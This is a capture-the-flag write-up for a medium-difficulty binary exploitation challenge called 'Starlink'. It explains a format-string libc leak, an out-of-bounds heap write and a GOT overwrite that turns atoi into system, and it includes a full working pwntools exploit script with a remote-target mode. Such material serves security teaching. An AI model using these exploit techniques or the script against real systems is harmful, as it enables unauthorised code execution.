**Challenge:** Starlink  
**Category:** Binary Exploitation / Pwn  
**Difficulty:** Medium  

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Static Analysis](#static-analysis)
4. [Dynamic Analysis with GDB](#dynamic-analysis-with-gdb)
5. [Understanding the Vulnerability](#understanding-the-vulnerability)
6. [Deep Dive: Key Concepts](#deep-dive-key-concepts)
   - [What is OOB?](#what-is-oob)
   - [Why GOT Overwrite Works Here](#why-got-overwrite-works-here)
   - [Why Empty Name Matches the Fake Node](#why-empty-name-matches-the-fake-node)
7. [Exploit Strategy](#exploit-strategy)
8. [Address Calculation](#address-calculation)
9. [Exploit Development](#exploit-development)
10. [Getting the Flag](#getting-the-flag)
11. [Lessons Learned](#lessons-learned)

---

## Challenge Overview

We're given a binary exploitation challenge with the following files:
- `starlink` - The vulnerable binary
- `libc.so.6` - GNU C Library (provided)
- `ld-linux-x86-64.so.2` - Dynamic linker (provided)

**Goal:** Exploit the binary to get command execution and read the flag.

---

## Initial Reconnaissance

### Step 1: File Information

```bash
file starlink
```

**Output (summarized):**
```
ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter ./ld-linux-x86-64.so.2
```

**Analysis:**
- **ELF 64-bit** (x86-64)
- **dynamically linked** (uses libc)
- **non-PIE** (fixed code/GOT addresses)

### Step 2: Security Protections

```bash
checksec --file=./starlink
```

**Output (summarized):**
```
RELRO: Partial
Canary: Found
NX: Enabled
PIE: No PIE
```

**Protection Analysis:**

| Protection | Status | Impact |
|------------|--------|--------|
| **RELRO** | Partial | GOT writable → function pointer overwrite possible |
| **Stack Canary** | Enabled | Stack overflows are harder |
| **NX** | Enabled | Stack shellcode won’t work |
| **PIE** | Disabled | Fixed code/GOT addresses |

**Conclusion:** A GOT overwrite is very promising because PIE is off and RELRO is partial.

### Step 3: Runtime Behavior

```bash
stdbuf -i0 -o0 -e0 ./starlink
```

**Observed UI:**
- Prompts for description, favorite number, secret word, name
- Then shows menu:
```
1.Create 2.Update 3.Delete 4.Description 5.Exit
```

---

## Static Analysis

### Reverse Engineering (Ghidra/objdump)

Use any disassembler; I used Ghidra for clarity.

```bash
objdump -d ./starlink | less
```

### Data Structures

**Heap Node (allocated size 0x128):**
- `+0x00` → name (max 0x19 bytes)
- `+0x19` → content (max 0x101 bytes)
- `+0x120` → next pointer

**Globals:**
- `0x4040e8`: head pointer
- `0x4040d8`: count

### Key Functions (Simplified)

#### 1) `main` (entry)
- Reads user inputs
- Does `printf(name)` → **format string vulnerability**
- Enters menu loop

#### 2) `Create`
- `malloc(0x128)`
- Reads name and content into the node
- Appends node to list

#### 3) `Update`
- Finds node by name
- Reads up to 0x400 bytes into stack buffer
- `strcpy(node+0x19, buffer)` → **heap overflow**

#### 4) `Delete`
- Frees node
- **Bug:** If deleting head, global head is not updated → **UAF**

#### 5) `Description` → Edit
- `malloc(0x18)`
- Asks for offset, then:
  ```c
  read(0, local_18 + offset, 0x18)
  ```
- **No bounds check** → **OOB write**

---

## Dynamic Analysis with GDB

I used pwndbg for precise offset verification.

### 1) Confirm libc leak offset

Input `%9$p` at the name prompt and check against `/proc/<pid>/maps`.

### 2) Confirm OOB write offset hits `head->next`

Breakpoint at `0x4014ea` (just before `read(0, local_18 + offset, 0x18)`):

```gdb
break *0x4014ea
run
```

At breakpoint:
```gdb
p/x $rax
p/x *(long*)0x4040e8
p/x $rax - (*(long*)0x4040e8 + 0x120)
```

**Expected:** `0x140` → so offset `-0x140` targets `head->next`.

### 3) Confirm fake node points to GOT

Breakpoint at `0x40176d` (before `strcpy` in Update):

```gdb
break *0x40176d
continue
```

At breakpoint:
```gdb
p/x $rdx
```

**Expected:** `0x404058` (this is `atoi@GOT`).

---

## Understanding the Vulnerability

We have **three relevant bugs**:
1. **Format string leak** in `printf(name)`
2. **OOB heap write** in Description edit
3. **Heap overflow** in Update (`strcpy` into node content)

The exploit uses the first two and the Update’s `strcpy` sink.

---

## Deep Dive: Key Concepts

### What is OOB?

**OOB = Out‑Of‑Bounds.**
It means you read/write past a buffer’s valid size. Here, the description buffer is 0x18 bytes, but the code allows writes to `buffer + offset` with any signed offset.

### Why GOT Overwrite Works Here

- **Partial RELRO** → GOT is writable
- **No PIE** → GOT addresses are fixed
- Menu input is processed by `atoi()` → easy trigger

So if we replace `atoi@GOT` with `system`, the menu input becomes a shell command.

### Why Empty Name Matches the Fake Node

`Update` uses `strcmp(user_input, node_name)`.
If we point `head->next` to `atoi@GOT - 0x19`, then `node_name` points at `atoi@GOT - 0x19`. The 0x19 bytes before `atoi@GOT` are zero (in `.got.plt`), so an empty string `""` compares equal.

---

## Exploit Strategy

**High-level chain:**
1. Leak libc with `%9$p`
2. Create two heap nodes
3. Use OOB write to overwrite `head->next`
4. Use Update with empty name to write into `atoi@GOT`
5. Overwrite `atoi@GOT` with `system`
6. Enter command at menu prompt → `system(command)`

---

## Address Calculation

**Libc leak:**
- `%9$p` gives a libc address
- `libc_base = leak - 0x2a1ca`

**Fake node address:**
- `fake_node = atoi@GOT - 0x19`

**OOB offset:**
- `offset = -0x140`

**B chunk header safety:**
- Preserve next chunk’s size field: `prev_size=0`, `size=0x131`

---

## Exploit Development

The working exploit is in `solve.py`. It’s staged and verified.

### Run locally
```bash
python3 solve.py
```

### One‑shot command (menu limit <= 9 bytes)
```bash
python3 solve.py CMD='ls /'
```

### Remote
```bash
python3 solve.py REMOTE HOST=<host> PORT=<port>
```

---

## Getting the Flag

Example run:
```bash
python3 solve.py CMD='ls /'
```

Expected output (example):
```
flag.txt
```

You can run a short command like `cat /flag.txt` **only if it fits within 9 bytes**. If it doesn’t, run `ls /` first and then adjust strategy or use shorter commands.

---


## Exploit Script (solve.py)

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./starlink", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

LEAK_OFF = 0x2A1CA        # %9$p -> libc+0x2a1ca
DESC_TO_HEAD_NEXT = -0x140
FAKE_NODE = elf.got["atoi"] - 0x19


def start():
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 1337)
        return remote(host, port)
    # Pipe mode + stdbuf avoids local buffering/PTY issues
    return process(["stdbuf", "-i0", "-o0", "-e0", elf.path], stdin=PIPE, stdout=PIPE, stderr=PIPE)


def create(io, name: bytes, content: bytes):
    io.sendline(b"1")
    io.recvuntil(b"Add a name (max 24):
")
    io.sendline(name)
    io.recvuntil(b"Add content (max 256):
")
    io.sendline(content)
    io.recvuntil(b"> ")


def exploit(io):
    # Startup + format leak
    io.recvuntil(b">")
    io.sendline(b"desc")
    io.recvuntil(b">")
    io.sendline(b"1")
    io.recvuntil(b"Add a secret word
")
    io.sendline(b"secret")
    io.recvuntil(b"What is you re name ?
")
    io.sendline(b"%9$p")

    out = io.recvuntil(b"> ")
    leak = int(out.split(b"welcome ")[1].split(b"
")[0], 16)
    libc.address = leak - LEAK_OFF
    system = libc.sym["system"]
    log.success(f"libc leak   = {hex(leak)}")
    log.success(f"libc base   = {hex(libc.address)}")
    log.success(f"system addr = {hex(system)}")

    # Heap setup
    create(io, b"A", b"x")
    create(io, b"B", b"y")

    # Description OOB write: overwrite A->next with FAKE_NODE.
    # Keep B chunk header intact: prev_size=0, size=0x131.
    io.sendline(b"4")
    io.recvuntil(b">")
    io.sendline(b"2")
    io.recvuntil(b"how many characters you need to correct?
>")
    io.sendline(str(DESC_TO_HEAD_NEXT).encode())
    io.recvuntil(b"[>] Enter correction: 
>")
    io.send(p64(FAKE_NODE) + p64(0) + p64(0x131) + b"
")
    io.recvuntil(b">")
    io.sendline(b"3")
    io.recvuntil(b"> ")
    log.success(f"forged next = {hex(FAKE_NODE)}")

    # Update with empty name => match fake node @ 0x40403f
    # strcpy(fake+0x19, data) => strcpy(atoi@got, data)
    io.sendline(b"2")
    io.recvuntil(b"Enter the name you want to update:
")
    io.sendline(b"")
    io.recvuntil(b"Give the new content :
")
    io.send(p64(system) + b"
")
    io.recvuntil(b"> ")
    log.success("atoi@got -> system")


def main():
    io = start()
    exploit(io)

    cmd = args.CMD.encode() if args.CMD else b"/bin/sh"
    if len(cmd) > 9:
        log.error("Menu input limit is 9 bytes; pass a shorter CMD.")
        return

    io.sendline(cmd)
    io.interactive()


if __name__ == "__main__":
    main()
```

## Lessons Learned

1. **Use leaks aggressively.** Format strings often solve ASLR.
2. **OOB writes are powerful.** They let you corrupt pointers rather than overflowing data blindly.
3. **GOT overwrite is still viable** when RELRO is partial and PIE is off.
4. **Validate offsets dynamically** before relying on static assumptions.
5. **Keep payloads size-aware.** The menu input is short; exploit must respect UI constraints.

---

## Appendix: Commands Used

Recon:
```bash
file starlink
checksec --file=./starlink
readelf -S ./starlink
readelf -l ./starlink
readelf -r ./starlink
strings -a ./libc.so.6 | grep "GNU C Library" | head -n 2
```

Dynamic (pwndbg):
```gdb
break *0x4014ea
break *0x40176d
run
# Check offsets:
p/x $rax
p/x *(long*)0x4040e8
p/x $rax - (*(long*)0x4040e8 + 0x120)
# Check GOT target:
p/x $rdx
```

Exploit:
```bash
python3 solve.py
python3 solve.py CMD='ls /'
